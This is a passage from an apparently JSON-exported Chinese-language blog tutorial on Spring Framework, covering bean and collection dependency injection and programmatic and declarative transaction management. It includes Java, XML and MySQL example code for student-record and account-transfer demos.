encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"outerBean\" class=\"...\"&gt; &lt;property name=\"target\"&gt; &lt;bean id=\"innerBean\" class=\"...\"/&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; DemoSpellChecker.java和MainApp.java不变。 TextEditor.java ，添加spellChecker属性getter方法和setter方法： 1234567891011121314151617package com.mi1k7ea;public class TextEditor &#123; private SpellChecker spellChecker; // a setter method to inject the dependency. public void setSpellChecker(SpellChecker spellChecker) &#123; System.out.println(\"Inside setSpellChecker.\" ); this.spellChecker = spellChecker; &#125; // a getter method to return spellChecker public SpellChecker getSpellChecker() &#123; return spellChecker; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; Beans.xml，定义了一个内部bean： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for textEditor bean using inner bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\"&gt; &lt;property name=\"spellChecker\"&gt; &lt;bean id=\"spellChecker\" class=\"com.mi1k7ea.SpellChecker\"/&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 运行输出，由于spellChecker是textEditor的内部bean，因此会调用到setter方法实现依赖注入： 0x05 集合注入为了可以传递多个值如Java Collection类型的List、Set、Map和Properties，Spring提供了四种类型的集合的配置元素，如下： 元素 描述 &lt;list&gt; 它有助于连线，如注入一列值，允许重复。 &lt;set&gt; 它有助于连线一组值，但不能重复。 &lt;map&gt; 它可以用来注入名称-值对的集合，其中名称和值可以是任何类型。 &lt;props&gt; 它可以用来注入名称-值对的集合，其中名称和值都是字符串类型。 可以使用&lt;list&gt;或&lt;set&gt;来连接任何java.util.Collection的实现或数组。 两种情况： 直接传递集合中的值； 传递一个Bean的引用作为集合的元素； DemoJavaCollection.java，分别拥有List、Set、Map和Properties四个类型的属性及其setter和getter方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.mi1k7ea;import java.util.List;import java.util.Map;import java.util.Properties;import java.util.Set;public class JavaCollection &#123; List addressList; Set addressSet; Map addressMap; Properties addressProp; // a setter method to set List public void setAddressList(List addressList) &#123; this.addressList = addressList; &#125; // prints and returns all the elements of the list. public List getAddressList() &#123; System.out.println(\"List Elements :\" + addressList); return addressList; &#125; // a setter method to set Set public void setAddressSet(Set addressSet) &#123; this.addressSet = addressSet; &#125; // prints and returns all the elements of the Set. public Set getAddressSet() &#123; System.out.println(\"Set Elements :\" + addressSet); return addressSet; &#125; // a setter method to set Map public void setAddressMap(Map addressMap) &#123; this.addressMap = addressMap; &#125; // prints and returns all the elements of the Map. public Map getAddressMap() &#123; System.out.println(\"Map Elements :\" + addressMap); return addressMap; &#125; // a setter method to set Property public void setAddressProp(Properties addressProp) &#123; this.addressProp = addressProp; &#125; // prints and returns all the elements of the Property. public Properties getAddressProp() &#123; System.out.println(\"Property Elements :\" + addressProp); return addressProp; &#125;&#125; MainApp.java，获取id为javaCollection的Bean类对象，并调用其所有属性的getter方法： 123456789101112131415package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); JavaCollection jc=(JavaCollection)context.getBean(\"javaCollection\"); jc.getAddressList(); jc.getAddressSet(); jc.getAddressMap(); jc.getAddressProp(); &#125;&#125; Beans.xml，在bean标签内定义了4个property子标签即使用基于setter方法实现依赖注入，其中分别使用list、set、map、props等子标签来直接传递多个值： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for javaCollection --&gt; &lt;bean id=\"javaCollection\" class=\"com.mi1k7ea.JavaCollection\"&gt; &lt;!-- results in a setAddressList(java.util.List) call --&gt; &lt;property name=\"addressList\"&gt; &lt;list&gt; &lt;value&gt;INDIA&lt;/value&gt; &lt;value&gt;Pakistan&lt;/value&gt; &lt;value&gt;USA&lt;/value&gt; &lt;value&gt;USA&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;!-- results in a setAddressSet(java.util.Set) call --&gt; &lt;property name=\"addressSet\"&gt; &lt;set&gt; &lt;value&gt;INDIA&lt;/value&gt; &lt;value&gt;Pakistan&lt;/value&gt; &lt;value&gt;USA&lt;/value&gt; &lt;value&gt;USA&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; &lt;!-- results in a setAddressMap(java.util.Map) call --&gt; &lt;property name=\"addressMap\"&gt; &lt;map&gt; &lt;entry key=\"1\" value=\"INDIA\"/&gt; &lt;entry key=\"2\" value=\"Pakistan\"/&gt; &lt;entry key=\"3\" value=\"USA\"/&gt; &lt;entry key=\"4\" value=\"USA\"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;!-- results in a setAddressProp(java.util.Properties) call --&gt; &lt;property name=\"addressProp\"&gt; &lt;props&gt; &lt;prop key=\"one\"&gt;INDIA&lt;/prop&gt; &lt;prop key=\"two\"&gt;Pakistan&lt;/prop&gt; &lt;prop key=\"three\"&gt;USA&lt;/prop&gt; &lt;prop key=\"four\"&gt;USA&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 运行输出： 注入Bean引用下面的Bean定义将帮助你理解如何注入bean的引用作为集合的元素。甚至你可以将引用和值混合在一起，如下所示： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Bean Definition to handle references and values --&gt; &lt;bean id=\"...\" class=\"...\"&gt; &lt;!-- Passing bean reference for java.util.List --&gt; &lt;property name=\"addressList\"&gt; &lt;list&gt; &lt;ref bean=\"address1\"/&gt; &lt;ref bean=\"address2\"/&gt; &lt;value&gt;Pakistan&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;!-- Passing bean reference for java.util.Set --&gt; &lt;property name=\"addressSet\"&gt; &lt;set&gt; &lt;ref bean=\"address1\"/&gt; &lt;ref bean=\"address2\"/&gt; &lt;value&gt;Pakistan&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; &lt;!-- Passing bean reference for java.util.Map --&gt; &lt;property name=\"addressMap\"&gt; &lt;map&gt; &lt;entry key=\"one\" value=\"INDIA\"/&gt; &lt;entry key =\"two\" value-ref=\"address1\"/&gt; &lt;entry key =\"three\" value-ref=\"address2\"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 为了使用上面的bean定义，你需要定义setter方法，它们应该也能够是用这种方式来处理引用。 注入null和空字符串的值如果你需要传递一个空字符串作为值，那么你可以传递它，如下所示： 123&lt;bean id=\"...\" class=\"exampleBean\"&gt; &lt;property name=\"email\" value=\"\"/&gt;&lt;/bean&gt; 前面的例子相当于Java代码：exampleBean.setEmail(&quot;&quot;);。 如果你需要传递一个NULL值，那么你可以传递它，如下所示： 123&lt;bean id=\"...\" class=\"exampleBean\"&gt; &lt;property name=\"email\"&gt;&lt;null/&gt;&lt;/property&gt;&lt;/bean&gt; 前面的例子相当于Java代码：exampleBean.setEmail(null);。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"Spring基础篇之事务管理","date":"2019-01-01T04:02:22.000Z","path":"2019/01/01/Spring基础篇之事务管理/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 Spring事务管理事务就是一系列的动作，它们综合在一起才是一个完整的工作单元，这些动作必须全部完成，如果有一个失败的话，那么事务就会回滚到最开始的状态，仿佛什么都没发生过一样。 在企业级应用程序开发中，事务管理是必不可少的技术，用来确保数据的完整性和一致性。 事务的概念可以描述为具有以下四个关键属性说成是ACID： 原子性：事务应该当作一个单独单元的操作，这意味着整个序列操作要么是成功，要么是失败的。 一致性：这表示数据库的引用完整性的一致性，表中唯一的主键等。 隔离性：可能同时处理很多有相同的数据集的事务，每个事务应该与其他事务隔离，以防止数据损坏。 持久性：一个事务一旦完成全部操作后，这个事务的结果必须是永久性的，不能因系统故障而从数据库中删除。 Spring的事务管理是基于AOP实现的，而AOP是以方法为单位的。Spring的事务属性分别为传播行为、隔离级别、只读和超时属性，这些属性提供了事务应用的方法和描述策略。 在Java EE开发经常采用的分层模式中，Spring的事务处理位于业务逻辑层，它提供了针对事务的解决方案。 0x02 三个核心类在Spring解压包的libs目录中，包含一个名称为spring-tx-4.1.6.RELEASE.jar的文件，该文件是 Spring 提供的用于事务管理的 JAR 包，其中包括事务管理的三个核心接口：PlatformTransactionManager、TransactionDefinition和TransactionStatus。 三个核心类之间的关系如图： PlatformTransactionManagerPlatformTransactionManager接口是Spring提供的平台事务管理器，用于管理事务。该接口中提供了三个事务操作方法，具体如下： TransactionStatus getTransaction（TransactionDefinition definition）：用于获取事务状态信息。 void commit（TransactionStatus status）：用于提交事务。 void rollback（TransactionStatus status）：用于回滚事务。 在项目中，Spring将xml中配置的事务详细信息封装到对象TransactionDefinition中，然后通过事务管理器的getTransaction()方法获得事务的状态（TransactionStatus），并对事务进行下一步的操作。 TransactionDefinitionTransactionDefinition接口是事务定义（描述）的对象，它提供了事务相关信息获取的方法，其中包括五个操作，具体如下： String getName()：获取事务对象名称。 int getIsolationLevel()：获取事务的隔离级别。 int getPropagationBehavior()：获取事务的传播行为。 int getTimeout()：获取事务的超时时间。 boolean isReadOnly()：获取事务是否只读。 隔离级别： 序号 隔离 &amp; 描述 1 TransactionDefinition.ISOLATION_DEFAULT这是默认的隔离级别。 2 TransactionDefinition.ISOLATION_READ_COMMITTED表明能够阻止误读；可以发生不可重复读和虚读。 3 TransactionDefinition.ISOLATION_READ_UNCOMMITTED表明可以发生误读、不可重复读和虚读。 4 TransactionDefinition.ISOLATION_REPEATABLE_READ表明能够阻止误读和不可重复读；可以发生虚读。 5 TransactionDefinition.ISOLATION_SERIALIZABLE表明能够阻止误读、不可重复读和虚读。 传播类型： 序号 传播 &amp; 描述 1 TransactionDefinition.PROPAGATION_MANDATORY支持当前事务；如果不存在当前事务，则抛出一个异常。 2 TransactionDefinition.PROPAGATION_NESTED如果存在当前事务，则在一个嵌套的事务中执行。 3 TransactionDefinition.PROPAGATION_NEVER不支持当前事务；如果存在当前事务，则抛出一个异常。 4 TransactionDefinition.PROPAGATION_NOT_SUPPORTED不支持当前事务；而总是执行非事务性。 5 TransactionDefinition.PROPAGATION_REQUIRED支持当前事务；如果不存在事务，则创建一个新的事务。 6 TransactionDefinition.PROPAGATION_REQUIRES_NEW创建一个新事务，如果存在一个事务，则把当前事务挂起。 7 TransactionDefinition.PROPAGATION_SUPPORTS支持当前事务；如果不存在，则执行非事务性。 8 TransactionDefinition.TIMEOUT_DEFAULT使用默认超时的底层事务系统，或者如果不支持超时则没有。 TransactionStatusTransactionStatus接口是事务的状态，它描述了某一时间点上事务的状态信息。其中包含六个操作，具体如下： 名称 说明 void flush() 刷新事务 boolean hasSavepoint() 获取是否存在保存点 boolean isCompleted() 获取事务是否完成 boolean isNewTransaction() 获取是否是新事务 boolean isRollbackOnly() 获取是否回滚 void setRollbackOnly() 设置事务回滚 0x03 编程式事务管理编程式事务管理方法允许你在对你的源代码编程的帮助下管理事务。这给了你极大地灵活性，但是它很难维护。 Demo注意，这里需要的jar包和前面《Spring基础篇之JDBC框架》中的Demo是一样的。 StudentMarks.java： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package com.mi1k7ea;public class StudentMarks &#123; private Integer age; private String name; private Integer id; private Integer marks; private Integer year; private Integer sid; public void setAge(Integer age) &#123; this.age = age; &#125; public Integer getAge() &#123; return age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setId(Integer id) &#123; this.id = id; &#125; public Integer getId() &#123; return id; &#125; public void setMarks(Integer marks) &#123; this.marks = marks; &#125; public Integer getMarks() &#123; return marks; &#125; public void setYear(Integer year) &#123; this.year = year; &#125; public Integer getYear() &#123; return year; &#125; public void setSid(Integer sid) &#123; this.sid = sid; &#125; public Integer getSid() &#123; return sid; &#125;&#125; StudentDAO.java，数据访问对象接口类： 12345678910111213141516171819202122package com.mi1k7ea;import javax.sql.DataSource;import java.util.List;public interface StudentDAO &#123; /** * This is the method to be used to initialize * database resources ie. connection. */ public void setDataSource(DataSource ds); /** * This is the method to be used to create * a record in the Student and Marks tables. */ public void create(String name, Integer age, Integer marks, Integer year); /** * This is the method to be used to list down * all the records from the Student and Marks tables. */ public List&lt;StudentMarks&gt; listStudents();&#125; StudentMarksMapper.java，： 12345678910111213141516171819package com.mi1k7ea;import org.springframework.jdbc.core.RowMapper;import java.sql.ResultSet;import java.sql.SQLException;public class StudentMarksMapper implements RowMapper&lt;StudentMarks&gt; &#123; public StudentMarks mapRow(ResultSet rs, int rowNum) throws SQLException &#123; StudentMarks studentMarks = new StudentMarks(); studentMarks.setId(rs.getInt(\"id\")); studentMarks.setName(rs.getString(\"name\")); studentMarks.setAge(rs.getInt(\"age\")); studentMarks.setSid(rs.getInt(\"sid\")); studentMarks.setMarks(rs.getInt(\"marks\")); studentMarks.setYear(rs.getInt(\"year\")); return studentMarks; &#125;&#125; StudentJDBCTemplate.java，DAO接口类StudentDAO的实现类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.mi1k7ea;import org.springframework.dao.DataAccessException;import org.springframework.jdbc.core.JdbcTemplate;import org.springframework.transaction.PlatformTransactionManager;import org.springframework.transaction.TransactionDefinition;import org.springframework.transaction.TransactionStatus;import org.springframework.transaction.support.DefaultTransactionDefinition;import javax.sql.DataSource;import java.util.List;public class StudentJDBCTemplate implements StudentDAO &#123; private DataSource dataSource; private JdbcTemplate jdbcTemplateObject; private PlatformTransactionManager transactionManager; public void setDataSource(DataSource dataSource) &#123; this.dataSource = dataSource; this.jdbcTemplateObject = new JdbcTemplate(dataSource); &#125; public void setTransactionManager( PlatformTransactionManager transactionManager) &#123; this.transactionManager = transactionManager; &#125; public void create(String name, Integer age, Integer marks, Integer year)&#123; TransactionDefinition def = new DefaultTransactionDefinition(); TransactionStatus status = transactionManager.getTransaction(def); try &#123; String SQL1 = \"insert into Student (name, age) values (?, ?)\"; jdbcTemplateObject.update( SQL1, name, age); // Get the latest student id to be used in Marks table String SQL2 = \"select max(id) from Student\"; int sid = jdbcTemplateObject.queryForInt( SQL2 ); String SQL3 = \"insert into Marks(sid, marks, year) \" + \"values (?, ?, ?)\"; jdbcTemplateObject.update( SQL3, sid, marks, year); System.out.println(\"Created Name = \" + name + \", Age = \" + age); transactionManager.commit(status); &#125; catch (DataAccessException e) &#123; System.out.println(\"Error in creating record, rolling back\"); transactionManager.rollback(status); throw e; &#125; return; &#125; public List&lt;StudentMarks&gt; listStudents() &#123; String SQL = \"select * from Student, Marks where Student.id=Marks.sid\"; List &lt;StudentMarks&gt; studentMarks = jdbcTemplateObject.query(SQL, new StudentMarksMapper()); return studentMarks; &#125;&#125; MainApp.java： 1234567891011121314151617181920212223242526package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import java.util.List;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); StudentJDBCTemplate studentJDBCTemplate = (StudentJDBCTemplate)context.getBean(\"studentJDBCTemplate\"); System.out.println(\"------Records creation--------\" ); studentJDBCTemplate.create(\"Zara\", 11, 99, 2010); studentJDBCTemplate.create(\"Nuha\", 20, 97, 2010); studentJDBCTemplate.create(\"Ayan\", 25, 100, 2011); System.out.println(\"------Listing all the records--------\" ); List&lt;StudentMarks&gt; studentMarks = studentJDBCTemplate.listStudents(); for (StudentMarks record : studentMarks) &#123; System.out.print(\"ID : \" + record.getId() ); System.out.print(\", Name : \" + record.getName() ); System.out.print(\", Marks : \" + record.getMarks()); System.out.print(\", Year : \" + record.getYear()); System.out.println(\", Age : \" + record.getAge()); &#125; &#125;&#125; Beans.xml： 1234567891011121314151617181920212223242526272829&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd \"&gt; &lt;!-- Initialization for data source --&gt; &lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\"&gt; &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"/&gt; &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/test?serverTimezone=UTC\"/&gt; &lt;property name=\"username\" value=\"root\"/&gt; &lt;property name=\"password\" value=\"\"/&gt; &lt;/bean&gt; &lt;!-- Initialization for TransactionManager --&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; &lt;/bean&gt; &lt;!-- Definition for studentJDBCTemplate bean --&gt; &lt;bean id=\"studentJDBCTemplate\" class=\"com.mi1k7ea.StudentJDBCTemplate\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; &lt;property name=\"transactionManager\" ref=\"transactionManager\" /&gt; &lt;/bean&gt;&lt;/beans&gt; 在执行之前，需要在数据库中执行以下SQL语句创建test数据库以及新建相关的表： 12345678910111213CREATE DATABASE test;USE test;CREATE TABLE Student( ID INT NOT NULL AUTO_INCREMENT, NAME VARCHAR(20) NOT NULL, AGE INT NOT NULL, PRIMARY KEY (ID));CREATE TABLE Marks( SID INT NOT NULL, MARKS INT NOT NULL, YEAR INT NOT NULL); 创建成功后，运行MainApp成功使用JDBC框架实现数据库的连接使用： 0x04 声明式事务管理Spring声明式事务管理在底层采用了AOP技术，其最大的优点在于无须通过编程的方式管理事务，只需要在配置文件中进行相关的规则声明，就可以将事务规则应用到业务逻辑中。 下面是与声明式事务相关的步骤： 我们使用标签，它创建一个事务处理的建议，同时，我们定义一个匹配所有方法的切入点，我们希望这些方法是事务型的并且会引用事务型的建议。 如果在事务型配置中包含了一个方法的名称，那么创建的建议在调用方法之前就会在事务中开始进行。 目标方法会在try/catch块中执行。 如果方法正常结束，AOP建议会成功的提交事务，否则它执行回滚操作。 Spring实现声明式事务管理主要有两种方式： 基于XML方式的声明式事务管理。 通过Annotation注解方式的事务管理。 基于XML实现事务管理基于XML形式实现的事务管理，就是通过XML配置文件来实现的事务管理。下面直接看示例。 注意，这里需要的jar包，在前面编程式事务管理的基础上，还需添加一个c3p0、mchange-commons的jar包。 先在MySQL中创建一个名为spring的数据库，然后在该数据库中创建一个account表，并向表中插入两条数据，其SQL执行语句如下： 123456789CREATE DATABASE spring;USE spring;CREATE TABLE account ( id INT (11) PRIMARY KEY AUTO_INCREMENT, username VARCHAR(20) NOT NULL, money INT DEFAULT NULL);INSERT INTO account VALUES (1,'zhangsan',1000);INSERT INTO account VALUES (2,'lisi',1000); 接着在项目的src下创建一个名为c3p0-db.properties的配置文件，这里使用C3P0数据源，需要在该文件中添加如下配置： 1234jdbc.driverClass = com.mysql.jdbc.Driverjdbc.jdbcUrl = jdbc:mysql://localhost:3306/spring?serverTimezone=UTCjdbc.user = rootjdbc.password = AccountDao.java，DAO接口类，在com.mi1k7ea.dao包中，并在接口中创建汇款和收款的方法： 12345678package com.mi1k7ea.dao;public interface AccountDao &#123; // 汇款 void out(String outUser, int money); // 收款 void in(String inUser, int money);&#125; AccountDaoImpl.java，DAO层接口实现类，在com.mi1k7ea.dao.impl包中，使用JdbcTemplate.update()方法实现了更新操作： 12345678910111213141516171819package com.mi1k7ea.dao.impl;import com.mi1k7ea.dao.AccountDao;import org.springframework.jdbc.core.JdbcTemplate;public class AccountDaoImpl implements AccountDao &#123; private JdbcTemplate jdbcTemplate; public void setJdbcTemplate(JdbcTemplate jdbcTemplate) &#123; this.jdbcTemplate = jdbcTemplate; &#125; // 汇款的实现方法 public void out(String outUser, int money) &#123; this.jdbcTemplate.update(\"update account set money =money-? where username =?\", money, outUser); &#125; // 收款的实现方法 public void in(String inUser, int money) &#123; this.jdbcTemplate.update(\"update account set money =money+? where username =?\", money, inUser); &#125;&#125; AccountService.java，Service层DAO接口类，在com.mi1k7ea.service包中： 123456package com.mi1k7ea.service;public interface AccountService &#123; // 转账 void transfer(String outUser, String inUser, int money);&#125; AccountServiceImpl.java，Service层DAO接口实现类，在com.mi1k7ea.service.impl包中，实现了AccountService接口，，并对转账方法进行了实现，根据参数的不同调用DAO层相应的方法： 123456789101112131415package com.mi1k7ea.service.impl;import com.mi1k7ea.dao.AccountDao;import com.mi1k7ea.service.AccountService;public class AccountServiceImpl implements AccountService &#123; private AccountDao accountDao; public void setAccountDao(AccountDao accountDao) &#123; this.accountDao = accountDao; &#125; public void transfer(String outUser, String inUser, int money) &#123; this.accountDao.out(outUser, money); this.accountDao.in(inUser, money); &#125;&#125; 创建Spirng配置文件applicationContext.xml，位于src目录下，其中使用&lt;tx:advice&gt;标记配置事务通知内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.5.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.5.xsd\"&gt; &lt;!-- 加载properties文件 --&gt; &lt;context:property-placeholder location=\"classpath:c3p0-db.properties\" /&gt; &lt;!-- 配置数据源，读取properties文件信息 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;jdbc.driverClass&#125;\" /&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;jdbc.jdbcUrl&#125;\" /&gt; &lt;property name=\"user\" value=\"$&#123;jdbc.user&#125;\" /&gt; &lt;property name=\"password\" value=\"$&#123;jdbc.password&#125;\" /&gt; &lt;/bean&gt; &lt;!-- 配置jdbc模板 --&gt; &lt;bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; &lt;/bean&gt; &lt;!-- 配置dao --&gt; &lt;bean id=\"accountDao\" class=\"com.mi1k7ea.dao.impl.AccountDaoImpl\"&gt; &lt;property name=\"jdbcTemplate\" ref=\"jdbcTemplate\" /&gt; &lt;/bean&gt; &lt;!-- 配置service --&gt; &lt;bean id=\"accountService\" class=\"com.mi1k7ea.service.impl.AccountServiceImpl\"&gt; &lt;property name=\"accountDao\" ref=\"accountDao\" /&gt; &lt;/bean&gt; &lt;!-- 事务管理器，依赖于数据源 --&gt; &lt;bean id=\"txManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; &lt;/bean&gt; &lt;!-- 编写通知：对事务进行增强（通知），需要编写切入点和具体执行事务的细节 --&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"txManager\"&gt; &lt;tx:attributes&gt; &lt;!-- 给切入点方法添加事务详情，name表示方法名称，*表示任意方法名称，propagation用于设置传播行为，read-only表示隔离级别，是否只读 --&gt; &lt;tx:method name=\"find*\" propagation=\"SUPPORTS\" rollback-for=\"Exception\" /&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" isolation=\"DEFAULT\" read-only=\"false\" /&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- aop编写，让Spring自动对目标生成代理，需要使用AspectJ的表达式 --&gt; &lt;aop:config&gt; &lt;!-- 切入点 --&gt; &lt;aop:pointcut expression=\"execution(* com.mi1k7ea.service.*.*(..))\" id=\"txPointCut\" /&gt; &lt;!-- 切面：将切入点与通知整合 --&gt; &lt;aop:advisor pointcut-ref=\"txPointCut\" advice-ref=\"txAdvice\" /&gt; &lt;/aop:config&gt;&lt;/beans&gt; MainApp.java： 12345678910111213package com.mi1k7ea;import com.mi1k7ea.service.AccountService;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); AccountService accountService = (AccountService) applicationContext.getBean(\"accountService\"); accountService.transfer(\"zhangsan\", \"lisi\", 100); &#125;&#125; 运行之后，无报错的话，在MySQL中就可以看到zhangsan用户的钱减少了100而lisi的钱多了100： 基于Annotation实现事务管理使用Annotation的方式非常简单，只需要在项目中做两件事： 在Spring容器中注册驱动，代码如下： 1&lt;tx:annotation-driven transaction-manager=\"txManager\"/&gt; 在需要使用事务的业务类或者方法中添加注解@Transactional，并配置@Transactional的参数； 下面还是修改上一小节的示例作为演示。 修改Spring配置文件applicationContext.xml，与原来的配置文件相比，这里只修改了事务管理器部分，新添加并注册了事务管理器的驱动： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.5.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.5.xsd\"&gt; &lt;!-- 加载properties文件 --&gt; &lt;context:property-placeholder location=\"classpath:c3p0-db.properties\" /&gt; &lt;!-- 配置数据源，读取properties文件信息 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;jdbc.driverClass&#125;\" /&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;jdbc.jdbcUrl&#125;\" /&gt; &lt;property name=\"user\" value=\"$&#123;jdbc.user&#125;\" /&gt; &lt;property name=\"password\" value=\"$&#123;jdbc.password&#125;\" /&gt; &lt;/bean&gt; &lt;!-- 配置jdbc模板 --&gt; &lt;bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; &lt;/bean&gt; &lt;!-- 配置dao --&gt; &lt;bean id=\"accountDao\" class=\"com.mi1k7ea.dao.impl.AccountDaoImpl\"&gt; &lt;property name=\"jdbcTemplate\" ref=\"jdbcTemplate\" /&gt; &lt;/bean&gt; &lt;!-- 配置service --&gt; &lt;bean id=\"accountService\" class=\"com.mi1k7ea.service.impl.AccountServiceImpl\"&gt; &lt;property name=\"accountDao\" ref=\"accountDao\" /&gt; &lt;/bean&gt; &lt;!-- 事务管理器，依赖于数据源 --&gt; &lt;bean id=\"txManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; &lt;/bean&gt; &lt;!-- 注册事务管理驱动 --&gt; &lt;tx:annotation-driven transaction-manager=\"txManager\"/&gt;&lt;/beans&gt; 需要注意得失，在学习AOP注解方式开发时，需要在配置文件中开启注解处理器，指定扫描哪些包下的注解，这里没有开启注解处理器是因为在XML中手动配置了AccountServiceImpl，而@Transactional注解就配置在该类中，所以会直接生效。 修改AccountServiceImpl.java，在文件中添加@Transactional注解及参数，注意在使用@Transactional注解时参数之间用”,”进行分割： 12345678910111213141516171819package com.mi1k7ea.service.impl;import com.mi1k7ea.dao.AccountDao;import com.mi1k7ea.service.AccountService;import org.springframework.transaction.annotation.Isolation;import org.springframework.transaction.annotation.Propagation;import org.springframework.transaction.annotation.Transactional;@Transactional(propagation = Propagation.REQUIRED, isolation = Isolation.DEFAULT, readOnly = false)public class 